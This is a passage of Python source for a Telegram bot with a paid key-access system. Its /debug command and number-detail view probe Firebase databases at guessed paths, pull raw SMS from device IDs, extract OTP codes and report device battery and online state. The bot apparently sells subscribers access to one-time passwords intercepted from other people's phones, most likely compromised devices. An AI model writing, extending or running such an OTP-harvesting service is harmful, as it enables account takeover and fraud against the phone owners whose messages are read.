    pkd = db.get("paid_key_duration") or "1440"
    is_lt   = 1 if pkt == "perm" else 0
    dur_min = int(pkd) if pkt == "temp" else None
    nk = gen_key()
    with db.cx() as c:
        c.execute(
            "INSERT OR IGNORE INTO access_keys(key,owner_id,created_at,used_by,is_lifetime,revoked,expiry_minutes,source) VALUES(?,?,?,?,?,0,?,?)",
            (nk, call.from_user.id, now, r["user_id"], is_lt, dur_min, "paid"))
        c.execute("UPDATE paid_payments SET status='approved', reviewed_at=?, key_issued=? WHERE id=?",
                  (now, nk, pid))
        c.execute("UPDATE users SET is_unlocked=1, access_key=?, key_expired_at=NULL WHERE user_id=?",
                  (nk, r["user_id"]))
        if pkt == "temp" and dur_min:
            expiry_dt  = _now_ist() + timedelta(minutes=dur_min)
            expiry_str = expiry_dt.strftime("%d-%m-%Y %H:%M:%S")
            c.execute("UPDATE users SET key_expiry_at=? WHERE user_id=?", (expiry_str, r["user_id"]))
    db.log_action(call.from_user.id, "Paid Key Approved", f"Payment #{pid} → key {nk[:12]}…")
    dur_lbl = _paid_dur_label(pkd) if pkt == "temp" else "permanent ♾"
    key_note = f"⏱ Valid for <b>{dur_lbl}</b> from now." if pkt == "temp" else "♾ <b>Permanent key</b> — never expires."
    try:
        await bot.send_message(
            r["user_id"],
            f"╔══════════════════════╗\n"
            f"  ✅ <b>PAYMENT APPROVED!</b>\n"
            f"╚══════════════════════╝\n\n"
            f"🎉 Your key is ready:\n\n"
            f"<code>{nk}</code>\n\n"
            f"{key_note}\n\n"
            f"<i>Use /start and tap 🔑 Enter Key to activate.</i>")
    except Exception: pass
    await call.answer("✅ Approved! Key sent to user.", show_alert=True)
    await cb_paid_view(call)


@router.callback_query(F.data.startswith("paid_reject_"))
async def cb_paid_reject(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    pid = int(call.data.split("paid_reject_")[1])
    r   = db.cx().execute("SELECT * FROM paid_payments WHERE id=?", (pid,)).fetchone()
    if not r: return await call.answer("Not found.", show_alert=True)
    if r["status"] != "pending":
        return await call.answer(f"Already {r['status']}.", show_alert=True)
    now = _now_ist().strftime("%d-%m-%Y %H:%M")
    with db.cx() as c:
        c.execute("UPDATE paid_payments SET status='rejected', reviewed_at=? WHERE id=?", (now, pid))
    db.log_action(call.from_user.id, "Paid Key Rejected", f"Payment #{pid}")
    try:
        await bot.send_message(
            r["user_id"],
            f"╔══════════════════════╗\n"
            f"  ❌ <b>PAYMENT REJECTED</b>\n"
            f"╚══════════════════════╝\n\n"
            f"Your payment could not be verified.\n"
            f"TXN: <code>{r['txn_id']}</code>\n\n"
            f"If you believe this is a mistake, contact admin.")
    except Exception: pass
    await call.answer("❌ Rejected. User notified.", show_alert=True)
    await cb_paid_view(call)


# ══════════════════════════════════════════════════════════════
# OTHER ADMIN HANDLERS
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "adm_keymode")
async def cb_keymode(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return
    nv = "0" if db.get("key_mode") == "1" else "1"
    db.set("key_mode", nv)
    db.log_action(call.from_user.id, "Key Mode Changed", f"{'ON' if nv=='1' else 'OFF'}")
    await call.answer(f"Key Mode: {'ON 🔐' if nv=='1' else 'OFF (open) 🔓'}", show_alert=True)


@router.callback_query(F.data == "adm_genkeys")
async def cb_genkeys(call: CallbackQuery, state: FSMContext):
    if call.from_user.id not in ADMIN_IDS: return
    await call.message.answer("🔑 How many keys? (1–50)")
    await state.set_state(S.gen_keys); await call.answer()


@router.message(S.gen_keys)
async def proc_genkeys(msg: Message, state: FSMContext):
    if msg.from_user.id not in ADMIN_IDS: return
    await state.clear()
    if not msg.text.isdigit() or not (1 <= int(msg.text) <= 50):
        return await msg.answer("❌ Enter 1-50.")
    count = int(msg.text); now = _now_ist().strftime("%d-%m-%Y %H:%M"); keys = []
    with db.cx() as c:
        for _ in range(count):
            k = gen_key()
            c.execute("INSERT OR IGNORE INTO access_keys VALUES(?,?,?,NULL,0,0)",
                      (k, msg.from_user.id, now))
            keys.append(k)
    db.log_action(msg.from_user.id, "Keys Generated", f"Count: {count}")
    await msg.answer(
        f"🔑 <b>{count} Key(s) Generated</b>\n━━━━━━━━━━━━━━━━━━\n"
        + "\n".join(f"<code>{k}</code>" for k in keys))


# ══════════════════════════════════════════════════════════════
# REFER KEY TYPE MANAGEMENT  (admin → ⚙ System → 🎫 Refer Key)
# ══════════════════════════════════════════════════════════════

_DUR_OPTS = [
    ("1 min (test)", "1"),
    ("2 hours",      "120"),
    ("24 hours",     "1440"),
    ("7 days",       "10080"),
    ("30 days",      "43200"),
    ("60 days",      "86400"),
]

@router.callback_query(F.data == "adm_refer_key_type")
async def cb_refer_key_type(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    rkt = db.get("refer_key_type") or "perm"
    dur = db.get("refer_key_duration") or "1440"
    _DUR_LABELS = {"1":"1 min","120":"2h","1440":"24h","10080":"7d","43200":"30d","86400":"60d"}
    dur_label = _DUR_LABELS.get(dur, f"{dur}m")
    cur_desc = ("♾ Permanent — keys never expire" if rkt == "perm"
                else f"⏱ Temporary — {dur_label} from activation")
    btns = [
        [InlineKeyboardButton(text="♾ Permanent Key (never expires)",
                              callback_data="refer_set_perm")],
        [InlineKeyboardButton(text="⏱ Temporary Key (set duration below)",
                              callback_data="refer_set_temp")],
    ]
    if rkt == "temp":
        btns += [[InlineKeyboardButton(text=f"{'✅ ' if dur==d else ''}{lbl}",
                                       callback_data=f"refer_dur_{d}")]
                 for lbl, d in _DUR_OPTS]
    btns.append([InlineKeyboardButton(text="🔙 System", callback_data="adm_system")])
    await call.message.edit_text(
        f"╔══════════════════════╗\n"
        f"  🎫 <b>REFER KEY SETTINGS</b>\n"
        f"╚══════════════════════╝\n\n"
        f"When a user completes the referral requirement, what type of key do they receive?\n\n"
        f"📌 <b>Current:</b> {cur_desc}\n\n"
        f"<i>Temporary keys expire after the set duration. Once expired, the user must refer "
        f"again to get a new key.</i>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))
    await call.answer()


@router.callback_query(F.data == "refer_set_perm")
async def cb_refer_set_perm(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    db.set("refer_key_type", "perm")
    db.log_action(call.from_user.id, "Refer Key Type", "Set to Permanent")
    await call.answer("✅ Referral keys will now be Permanent!", show_alert=True)
    await cb_refer_key_type(call)


@router.callback_query(F.data == "refer_set_temp")
async def cb_refer_set_temp(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    db.set("refer_key_type", "temp")
    db.log_action(call.from_user.id, "Refer Key Type", "Set to Temporary")
    await call.answer("✅ Referral keys will now be Temporary. Select duration below.", show_alert=True)
    await cb_refer_key_type(call)


@router.callback_query(F.data.startswith("refer_dur_"))
async def cb_refer_dur(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    dur = call.data.split("refer_dur_")[1]
    db.set("refer_key_type", "temp")
    db.set("refer_key_duration", dur)
    _DUR_LABELS = {"1":"1 min","120":"2h","1440":"24h","10080":"7d","43200":"30d","86400":"60d"}
    label = _DUR_LABELS.get(dur, f"{dur}m")
    db.log_action(call.from_user.id, "Refer Key Duration", f"Set to {label}")
    await call.answer(f"✅ Referral keys set to Temporary — {label}", show_alert=True)
    await cb_refer_key_type(call)


# ══════════════════════════════════════════════════════════════
# TEMPORARY KEY GENERATION  (admin → ⚙ System → ⏱ Temp Keys)
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "adm_gen_temp_keys")
async def cb_gen_temp_keys(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    btns = [[InlineKeyboardButton(text=lbl, callback_data=f"temp_dur_sel_{d}")]
            for lbl, d in _DUR_OPTS]
    btns.append([InlineKeyboardButton(text="🔙 System", callback_data="adm_system")])
    await call.message.edit_text(
        f"╔══════════════════════╗\n"
        f"  ⏱ <b>TEMP KEY GENERATOR</b>\n"
        f"╚══════════════════════╝\n\n"
        f"Select validity duration for the temporary keys:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))
    await call.answer()


@router.callback_query(F.data.startswith("temp_dur_sel_"))
async def cb_temp_dur_sel(call: CallbackQuery, state: FSMContext):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    dur = call.data.split("temp_dur_sel_")[1]
    _DUR_LABELS = {"1":"1 min","120":"2h","1440":"24h","10080":"7d","43200":"30d","86400":"60d"}
    label = _DUR_LABELS.get(dur, f"{dur}m")
    await state.update_data(temp_key_dur=dur, temp_key_label=label)
    await state.set_state(S.gen_temp_keys)
    await call.message.answer(
        f"⏱ <b>Temp Keys — {label}</b>\n\n"
        f"How many temporary keys? (1–50)")
    await call.answer()


@router.message(S.gen_temp_keys)
async def proc_gen_temp_keys(msg: Message, state: FSMContext):
    if msg.from_user.id not in ADMIN_IDS: return
    data = await state.get_data()
    await state.clear()
    if not msg.text.isdigit() or not (1 <= int(msg.text) <= 50):
        return await msg.answer("❌ Enter 1-50.")
    count = int(msg.text)
    dur   = data.get("temp_key_dur", "1440")
    label = data.get("temp_key_label", "24h")
    now   = _now_ist().strftime("%d-%m-%Y %H:%M")
    keys  = []
    with db.cx() as c:
        for _ in range(count):
            k = gen_key()
            c.execute(
                "INSERT OR IGNORE INTO access_keys(key,owner_id,created_at,used_by,is_lifetime,revoked,expiry_minutes) "
                "VALUES(?,?,?,NULL,0,0,?)",
                (k, msg.from_user.id, now, int(dur)))
            keys.append(k)
    db.log_action(msg.from_user.id, "Temp Keys Generated", f"Count:{count} Dur:{label}")
    await msg.answer(
        f"⏱ <b>{count} Temp Key(s) — {label}</b>\n━━━━━━━━━━━━━━━━━━\n"
        + "\n".join(f"<code>{k}</code>" for k in keys)
        + f"\n\n<i>Each key expires {label} after activation.</i>")


@router.callback_query(F.data == "adm_report")
async def cb_report(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return
    locked = db.cx().execute("SELECT * FROM numbers WHERE assigned_to IS NOT NULL").fetchall()
    total  = db.cx().execute("SELECT COUNT(*) as c FROM numbers").fetchone()["c"]
    active = db.cx().execute("SELECT COUNT(*) as c FROM numbers WHERE status='Active'").fetchone()["c"]
    ki      = db.cx().execute("SELECT COUNT(*) as c FROM access_keys WHERE revoked=0").fetchone()["c"]
    ku      = db.cx().execute("SELECT COUNT(*) as c FROM access_keys WHERE used_by IS NOT NULL").fetchone()["c"]
    k_refer = db.cx().execute("SELECT COUNT(*) as c FROM access_keys WHERE source='refer'").fetchone()["c"]
    k_paid  = db.cx().execute("SELECT COUNT(*) as c FROM access_keys WHERE source='paid'").fetchone()["c"]
    k_admin = db.cx().execute("SELECT COUNT(*) as c FROM access_keys WHERE source='admin' OR source IS NULL").fetchone()["c"]
    paid_pending = db.cx().execute("SELECT COUNT(*) as c FROM paid_payments WHERE status='pending'").fetchone()["c"]
    paid_approved = db.cx().execute("SELECT COUNT(*) as c FROM paid_payments WHERE status='approved'").fetchone()["c"]
    t = (f"╔══════════════════════╗\n"
         f"  📊 <b>LIVE STATUS</b>\n"
         f"╚══════════════════════╝\n\n"
         f"📱 Total: <b>{total}</b>  |  🟢 Active: <b>{active}</b>  |  🔒 In Use: <b>{len(locked)}</b>\n"
         f"🔑 Keys: <b>{ki}</b> issued / <b>{ku}</b> used\n"
         f"📡 SSE Streams: <b>{len(sse_tasks)}</b> active\n\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
         f"🔑 <b>Key Sources</b>\n"
         f"👥 By Refer: <b>{k_refer}</b>\n"
         f"💳 By Paid:  <b>{k_paid}</b>  (⏳ pending: {paid_pending} / ✅ approved: {paid_approved})\n"
         f"🛠 By Admin: <b>{k_admin}</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n\n")
    offline_c = db.cx().execute(
        "SELECT COUNT(*) as c FROM numbers WHERE status='Inactive' AND is_ghost=0").fetchone()["c"]
    ghost_c   = db.cx().execute(
        "SELECT COUNT(*) as c FROM numbers WHERE is_ghost=1 AND number NOT LIKE 'DEV-%'").fetchone()["c"]
    pending_c = db.cx().execute(
        "SELECT COUNT(*) as c FROM ai_pending WHERE status='pending'").fetchone()["c"]
    alert_state = "🔕 PAUSED" if _alerts_paused else "🔔 Active"

    t += (f"🔴 Offline: <b>{offline_c}</b>  |  👻 Ghost: <b>{ghost_c}</b>\n"
          f"🤖 AI Pending Approval: <b>{pending_c}</b>\n"
          f"🚨 Alerts: <b>{alert_state}</b>\n\n")
    t += ("\n".join(
        f"🔒 <code>{_disp(r['number'])}</code> → UID <code>{r['assigned_to']}</code>"
        for r in locked) if locked else "<i>All numbers free.</i>")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📴 View Offline/Gone",    callback_data="adm_offline_list"),
         InlineKeyboardButton(text="🔥 Hot Numbers",          callback_data="hot_numbers")],
        [InlineKeyboardButton(text="🔕 Stop Alerts" if not _alerts_paused else "🔔 Resume Alerts",
                              callback_data="stop_alerts" if not _alerts_paused else "resume_alerts")],
        [InlineKeyboardButton(text="🔙 Admin",                callback_data="back_admin")],
    ])
    await call.message.answer(t[:4000], reply_markup=kb); await call.answer()


@router.callback_query(F.data == "adm_limit")
async def cb_limit(call: CallbackQuery, state: FSMContext):
    if call.from_user.id not in ADMIN_IDS: return
    cur = db.get("refer_limit") or "1"
    await call.message.answer(f"📈 Current refer limit: <b>{cur}</b>\n\nSend new number (0 = disabled):")
    await state.set_state(S.set_limit); await call.answer()


@router.message(S.set_limit)
async def proc_limit(msg: Message, state: FSMContext):
    if msg.from_user.id not in ADMIN_IDS or not msg.text.isdigit(): return
    db.set("refer_limit", msg.text.strip())
    db.log_action(msg.from_user.id, "Refer Limit Changed", msg.text.strip())
    await msg.answer(f"✅ Refer limit set to <b>{msg.text.strip()}</b>.")
    await state.clear()


@router.callback_query(F.data == "adm_addnum")
async def cb_addnum(call: CallbackQuery, state: FSMContext):
    if call.from_user.id not in ADMIN_IDS: return
    await call.message.answer("📱 Send number (e.g. +919XXXXXXXXX):")
    await state.set_state(S.add_num); await call.answer()


@router.message(S.add_num)
async def proc_addnum(msg: Message, state: FSMContext):
    if msg.from_user.id not in ADMIN_IDS: return
    with db.cx() as c:
        c.execute("INSERT OR IGNORE INTO numbers(number) VALUES(?)", (msg.text.strip(),))
    t = db.cx().execute("SELECT COUNT(*) as c FROM numbers").fetchone()["c"]
    db.log_action(msg.from_user.id, "Number Added Manually", msg.text.strip())
    await msg.answer(f"✅ <code>{msg.text.strip()}</code> added. Total: <b>{t}</b>")
    await state.clear()


@router.callback_query(F.data == "adm_addch")
async def cb_addch(call: CallbackQuery, state: FSMContext):
    if call.from_user.id not in ADMIN_IDS: return
    await call.message.answer("📢 Send Channel ID (e.g. -1001234567890):")
    await state.set_state(S.add_ch_id); await call.answer()


@router.message(S.add_ch_id)
async def proc_ch_id(msg: Message, state: FSMContext):
    if msg.from_user.id not in ADMIN_IDS: return
    await state.update_data(ch_id=msg.text.strip())
    await msg.answer("🔗 Now send the Channel invite link:")
    await state.set_state(S.add_ch_link)


@router.message(S.add_ch_link)
async def proc_ch_link(msg: Message, state: FSMContext):
    if msg.from_user.id not in ADMIN_IDS: return
    data = await state.get_data()
    with db.cx() as c:
        c.execute("INSERT OR REPLACE INTO channels VALUES(?,?)", (data["ch_id"], msg.text.strip()))
    db.log_action(msg.from_user.id, "Channel Added", data["ch_id"])
    await msg.answer("✅ Channel added!")
    await state.clear()


@router.callback_query(F.data == "adm_removech")
async def cb_removech(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return
    channels = db.cx().execute("SELECT * FROM channels").fetchall()
    if not channels:
        await call.message.answer("ℹ️ No channels added yet.")
        await call.answer(); return
    rows = []
    for ch in channels:
        label = ch["channel_link"] or ch["channel_id"]
        rows.append([InlineKeyboardButton(
            text=f"🗑 {label}",
            callback_data=f"adm_delch_{ch['channel_id']}"
        )])
    rows.append([InlineKeyboardButton(text="🔙 Back", callback_data="adm_settings")])
    await call.message.answer(
        "╔══════════════════════╗\n"
        "  🗑 <b>REMOVE CHANNEL</b>\n"
        "╚══════════════════════╝\n\n"
        "Tap a channel to remove it:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows)
    )
    await call.answer()


@router.callback_query(F.data.startswith("adm_delch_"))
async def cb_delch_confirm(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return
    ch_id = call.data.replace("adm_delch_", "", 1)
    with db.cx() as c:
        c.execute("DELETE FROM channels WHERE channel_id=?", (ch_id,))
    db.log_action(call.from_user.id, "Channel Removed", ch_id)
    # Refresh the list
    channels = db.cx().execute("SELECT * FROM channels").fetchall()
    if not channels:
        await call.message.edit_text(
            "✅ Channel removed.\n\nNo channels remaining.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(text="🔙 Back", callback_data="adm_settings")
            ]])
        )
        await call.answer("✅ Removed"); return
    rows = []
    for ch in channels:
        label = ch["channel_link"] or ch["channel_id"]
        rows.append([InlineKeyboardButton(
            text=f"🗑 {label}",
            callback_data=f"adm_delch_{ch['channel_id']}"
        )])
    rows.append([InlineKeyboardButton(text="🔙 Back", callback_data="adm_settings")])
    await call.message.edit_text(
        "╔══════════════════════╗\n"
        "  🗑 <b>REMOVE CHANNEL</b>\n"
        "╚══════════════════════╝\n\n"
        "✅ Removed. Tap another to remove more:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows)
    )
    await call.answer("✅ Removed")


@router.callback_query(F.data == "adm_broadcast")
async def cb_bcast_start(call: CallbackQuery, state: FSMContext):
    if call.from_user.id not in ADMIN_IDS: return
    await call.message.answer(
        "📢 <b>Broadcast</b>\n\n"
        "Send your message (text, photo, or media):\n"
        "<i>Text message will be sent to all unlocked users.</i>")
    await state.set_state(S.b_msg); await call.answer()


@router.message(S.b_msg)
async def proc_bcast(msg: Message, state: FSMContext):
    if msg.from_user.id not in ADMIN_IDS: return
    uids = [r["user_id"] for r in
            db.cx().execute("SELECT user_id FROM users WHERE is_banned=0").fetchall()]
    sm   = await msg.answer(f"⚡ <i>Broadcasting to {len(uids)} users…</i>")
    await state.clear(); s = f = 0
    for i in range(0, len(uids), 25):
        if msg.photo:
            res = await asyncio.gather(
                *[bot.send_photo(u, msg.photo[-1].file_id,
                                 caption=msg.caption or "") for u in uids[i:i+25]],
                return_exceptions=True)
        elif msg.document:
            res = await asyncio.gather(
                *[bot.send_document(u, msg.document.file_id,
                                    caption=msg.caption or "") for u in uids[i:i+25]],
                return_exceptions=True)
        else:
            res = await asyncio.gather(
                *[bot.send_message(u, msg.text) for u in uids[i:i+25]],
                return_exceptions=True)
        s += sum(1 for r in res if not isinstance(r, Exception))
        f += sum(1 for r in res if isinstance(r, Exception))
        await asyncio.sleep(1)
    db.log_action(msg.from_user.id, "Broadcast Sent", f"Success:{s} Fail:{f}")
    await sm.edit_text(f"📢 <b>Broadcast Done</b>\n✅ Sent: {s}  |  ❌ Failed: {f}")


@router.callback_query(F.data == "adm_alerts_cfg")
async def cb_alerts_cfg(call: CallbackQuery):
    await call.answer()                          # must be first — Telegram expires queries in 30 s
    if call.from_user.id not in ADMIN_IDS: return
    status_line = "🔕 <b>PAUSED</b> — tap Resume to re-enable" if _alerts_paused else "🔔 <b>Active</b>"
    toggle_btn  = ("🔔 Resume Alerts", "resume_alerts") if _alerts_paused else ("🔕 Stop All Alerts", "stop_alerts")
    await call.message.answer(
        "╔══════════════════════╗\n"
        "  🚨 <b>ALERT CONFIG</b>\n"
        "╚══════════════════════╝\n\n"
        f"🚨 <b>Status:</b> {status_line}\n\n"
        "✅ 🧠 New Structure Learned\n"
        "✅ ❌ Parse Failure\n"
        "✅ 👻 Ghost Recovered\n"
        "✅ ⚠️ Firebase Quarantined/Recovered\n"
        "✅ 🟢 Device Online\n"
        "✅ 🔴 Device Offline\n"
        "✅ 🚨 Watchlist Hit\n"
        "✅ 🤖 AI Failure\n"
        "✅ 🔥 AI Hot Suggest\n"
        "✅ 🔍 Deep Scan Hits\n\n"
        "<i>Pausing stops ALL push alerts until resumed.</i>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=toggle_btn[0], callback_data=toggle_btn[1])],
            [InlineKeyboardButton(text="🔙 Admin",    callback_data="back_admin")],
        ]))
    await call.answer()


# ══════════════════════════════════════════════════════════════
# /debug COMMAND
# ══════════════════════════════════════════════════════════════

@router.message(Command("debug"))
async def cmd_debug(msg: Message):
    if msg.from_user.id not in ADMIN_IDS: return await msg.answer("⛔ Admin only.")
    parts = msg.text.strip().split(None, 1)
    if len(parts) < 2:
        return await msg.answer("🛠 <b>Usage:</b> <code>/debug &lt;device_id&gt;</code>")
    dev_id  = parts[1].strip()
    sm      = await msg.answer(f"🔍 <i>Fetching raw SMS for: <code>{dev_id}</code>…</i>")
    srcs    = db.cx().execute("SELECT url, api_key FROM firebase_sources").fetchall()
    num_row = db.cx().execute("SELECT * FROM numbers WHERE device_id=?", (dev_id,)).fetchone()
    all_results = []
    async with aiohttp.ClientSession() as sess:
        for src in srcs:
            base    = src["url"]; api_key = src["api_key"]
            sh      = await fb_get(sess, f"{base}/.json?shallow=true", api_key=api_key)
            rk      = list(sh.keys())[0] if isinstance(sh, dict) and sh else None
            paths   = [f"{base}/sms/{dev_id}", f"{base}/user_sms/{dev_id}",
                       f"{base}/messages/{dev_id}", f"{base}/{dev_id}/sms",
                       f"{base}/All_Users/sms/{dev_id}"]
            if rk: paths.insert(0, f"{base}/{rk}/All_User/Sms/{dev_id}")
            if num_row and num_row["sms_path"]: paths.insert(0, num_row["sms_path"])
            for path in paths:
                node = await fb_get(sess, f"{path}.json", api_key=api_key)
                if not isinstance(node, dict) or not node: continue
                for entry, key in _top_n(node, 10):
                    mt, sender, ts = _norm_sms(entry)
                    if mt: all_results.append((path, key, sender, mt, ts))
                if all_results: break
            if all_results: break
    if not all_results:
        return await sm.edit_text(f"📭 No SMS found for device: <code>{dev_id}</code>")
    text = (f"╔══════════════════════╗\n"
            f"  🛠 <b>DEBUG: {dev_id[:16]}</b>\n"
            f"╚══════════════════════╝\n\n"
            f"📂 Path: <code>{all_results[0][0]}</code>\n"
            f"📨 Last {len(all_results)} entries:\n\n")
    for i, (path, key, sender, body, ts) in enumerate(all_results, 1):
        otp = re.search(r'\b(\d{4,8})\b', body)
        otp_str = f"  🎯 <code>{otp.group(1)}</code>" if otp else ""
        text += (f"<b>#{i}</b> 🕐 {ts}{otp_str}\n"
                 f"  📨 {sender}\n"
                 f"  💬 <i>{body[:100]}</i>\n\n")
    await sm.edit_text(text[:4000])


# ══════════════════════════════════════════════════════════════
# NUMBER DETAIL  (auto last-5 view when clicking from list)
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data.startswith("numdetail_"))
async def cb_numdetail(call: CallbackQuery):
    """Show number detail page with last 5 messages + monitor + notification controls."""
    if not await check_auth(call.from_user.id, call.message): return await call.answer()
    nid = int(call.data.split("_")[1])
    uid = call.from_user.id
    num = db.cx().execute("SELECT * FROM numbers WHERE id=?", (nid,)).fetchone()
    if not num: return await call.answer("Number not found.", show_alert=True)
    await call.answer()                              # answer immediately — never let it expire

    sm = await call.message.answer("<i>⏳ Loading details…</i>")
    try:
        # Run Firebase SMS fetch + device health CHECK in PARALLEL — cuts wait time in half
        msgs_fut, health_fut = await asyncio.gather(
            fetch_last_n_sms(num["number"], num["device_id"],
                             num["fb_source"], num["sms_path"], n=5),
            dev_health(num["device_id"], num["fb_source"], num["status_path"]),
            return_exceptions=True)

        msgs        = msgs_fut        if not isinstance(msgs_fut,   Exception) else []
        health_res  = health_fut      if not isinstance(health_fut, Exception) else (True, None, None)
        online, battery, health_warn = health_res

        # DB fallback when Firebase returned nothing
        if not msgs:
            db_msgs = db.cx().execute(
                "SELECT * FROM sms_log WHERE number=? ORDER BY id DESC LIMIT 5",
                (num["number"],)).fetchall()
            msgs = [{"sender": r["sender"], "message": r["full_msg"] or "",
                     "time": r["received_at"], "otp": r["otp"]} for r in db_msgs]

        # Re-fetch num to get updated carrier after dev_health
        num = db.cx().execute("SELECT * FROM numbers WHERE id=?", (nid,)).fetchone()

        total_sms = db.cx().execute(
            "SELECT COUNT(*) as c FROM sms_log WHERE number=?",
            (num["number"],)).fetchone()["c"]

        notif_on = db.cx().execute(
            "SELECT 1 FROM watchlist WHERE number=? AND added_by=?",
            (num["number"], uid)).fetchone() is not None

        text = fmt_device_detail(dict(num), msgs, battery=battery,
                                  online=online, total_sms=total_sms)
        if health_warn:
            text += f"\n\n{health_warn}"

        notif_txt  = "🔕 Notif OFF" if notif_on else "🔔 Notif ON"
        notif_data = f"notif_off_{nid}" if notif_on else f"notif_on_{nid}"

        is_admin = uid in ADMIN_IDS
        rows_kb = [
            [InlineKeyboardButton(text="📡 Monitor Live",    callback_data=f"mon_{nid}"),
             InlineKeyboardButton(text="🔄 Refresh",         callback_data=f"numdetail_{nid}")],
            [InlineKeyboardButton(text=notif_txt,            callback_data=notif_data),
             InlineKeyboardButton(text="💬 Full History",    callback_data=f"my_history")],
        ]
        if is_admin:
            ghost_flag = num.get("is_ghost", 0)
            if ghost_flag:
                rows_kb.append([InlineKeyboardButton(
                    text="✅ Restore → Active",
                    callback_data=f"admin_unghost_{nid}")])
            else:
                rows_kb.append([InlineKeyboardButton(
                    text="👻 Mark as Ghost (Admin)",
                    callback_data=f"admin_mark_ghost_{nid}")])
        rpt_count = db.cx().execute(
            "SELECT COUNT(*) as c FROM number_reports WHERE number_id=?", (nid,)).fetchone()["c"]
        already_rpt = db.cx().execute(
            "SELECT 1 FROM number_reports WHERE number_id=? AND reported_by=?",
            (nid, uid)).fetchone() is not None
        if already_rpt:
            rows_kb.append([InlineKeyboardButton(
                text=f"⚠️ You Reported Dead ({rpt_count}/3)",
                callback_data="noop_report")])
        else:
            rows_kb.append([InlineKeyboardButton(
                text=f"🚨 Report Dead ({rpt_count}/3)",
                callback_data=f"report_dead_{nid}")])
        rows_kb.append([InlineKeyboardButton(text="🔙 Back", callback_data="back_home")])
        kb = InlineKeyboardMarkup(inline_keyboard=rows_kb)
        await sm.edit_text(text[:4000], reply_markup=kb)

    except Exception as e:
        log.warning("numdetail error nid=%s: %s", nid, e)
        try:
            await sm.edit_text(
                "❌ <b>Failed to load details.</b>\n\n"
                "<i>Firebase may be slow. Try refreshing.</i>",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                    InlineKeyboardButton(text="🔄 Retry", callback_data=f"numdetail_{nid}"),
                    InlineKeyboardButton(text="🔙 Back",  callback_data="back_home"),
                ]]))
        except Exception:
            pass


@router.callback_query(F.data == "noop_report")
async def cb_noop_report(call: CallbackQuery):
    await call.answer("⚠️ You have already reported this number.", show_alert=True)


@router.callback_query(F.data.startswith("report_dead_"))
async def cb_report_dead(call: CallbackQuery):
    """User reports a number as dead/unresponsive. 3 unique reports → demote to Standby tier."""
    if not await check_auth(call.from_user.id, call.message): return await call.answer()
    nid = int(call.data.split("_")[2])
    uid = call.from_user.id
    num = db.cx().execute("SELECT * FROM numbers WHERE id=?", (nid,)).fetchone()
    if not num:
        return await call.answer("Number not found.", show_alert=True)

    now_str = _now_ist().strftime("%d-%m-%Y %H:%M")
    try:
        with db.cx() as c:
            c.execute(
                "INSERT OR IGNORE INTO number_reports(number_id, reported_by, reported_at) "
                "VALUES(?,?,?)", (nid, uid, now_str))
    except Exception:
        pass

    rpt_count = db.cx().execute(
        "SELECT COUNT(*) as c FROM number_reports WHERE number_id=?", (nid,)).fetchone()["c"]

    if rpt_count >= 3:
        # Demote to Standby tier by setting report_count ≥ 3
        with db.cx() as c:
            c.execute("UPDATE numbers SET report_count=? WHERE id=?", (rpt_count, nid))
        await call.answer(
            f"🚨 Reported! {rpt_count}/3 reports — number moved to 🟡 Standby tier.",
            show_alert=True)
        # Notify admins
        nd = _disp(num["number"])
        for aid in ADMIN_IDS:
            try:
                await bot.send_message(
                    aid,
                    f"🚨 <b>Number Crowd-Reported Dead</b>\n\n"
                    f"📞 <code>{nd}</code>\n"
                    f"👥 {rpt_count} unique reports → moved to 🟡 Standby\n"
                    f"<i>It will auto-restore to 🟢 Hot when it receives an SMS.</i>")
            except Exception:
                pass
    else:
        with db.cx() as c:
            c.execute("UPDATE numbers SET report_count=? WHERE id=?", (rpt_count, nid))
        await call.answer(
            f"🚨 Reported! {rpt_count}/3 — need {3 - rpt_count} more report(s) to demote.",
            show_alert=True)

    # Send a brief follow-up so the user knows to tap the number again to see the updated count.
    # (Do NOT clear the keyboard — that would leave the user with no navigation buttons.)
    try:
        await call.message.answer(
            f"🚨 <b>Report recorded</b>  ({rpt_count}/3)\n\n"
            f"<i>Tap the number again in the list to see updated status.</i>")
    except Exception:
        pass


@router.callback_query(F.data.startswith("admin_mark_ghost_"))
async def cb_admin_mark_ghost(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    nid = int(call.data.split("_")[-1])
    num = db.cx().execute("SELECT * FROM numbers WHERE id=?", (nid,)).fetchone()
    if not num: return await call.answer("Number not found.", show_alert=True)
    with db.cx() as c:
        c.execute("UPDATE numbers SET is_ghost=1, status='Inactive', assigned_to=NULL, assigned_at=NULL WHERE id=?", (nid,))
        c.execute("INSERT OR IGNORE INTO ghost_queue(number_id,category,probe_count) VALUES(?,'Recoverable',0)", (nid,))
    db.log_action(call.from_user.id, "Admin Mark Ghost", num["number"])
    await call.answer("👻 Marked as Ghost.", show_alert=True)
    try:
        await call.message.edit_text(
            f"👻 <b>MARKED AS GHOST</b>\n\n"
            f"<code>{_disp(num['number'])}</code> has been moved to the Ghost list.\n"
